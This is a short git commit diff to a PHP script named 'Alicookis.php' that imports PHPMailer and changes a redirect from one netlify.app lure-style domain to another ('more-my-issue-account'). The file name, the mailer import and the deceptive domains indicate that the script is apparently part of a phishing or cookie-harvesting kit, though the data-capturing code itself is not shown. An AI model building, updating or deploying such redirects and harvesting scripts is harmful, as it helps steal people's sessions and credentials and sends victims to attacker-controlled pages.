d760fea9f4a62cc6bfb057550b942a7e993a28e3
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-08 23:15:11 +0500

    Update Alicookis.php

--- Alicookis.php
+++ Alicookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://sure-three-page-info.netlify.app/");
+header("Location: https://more-my-issue-account.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
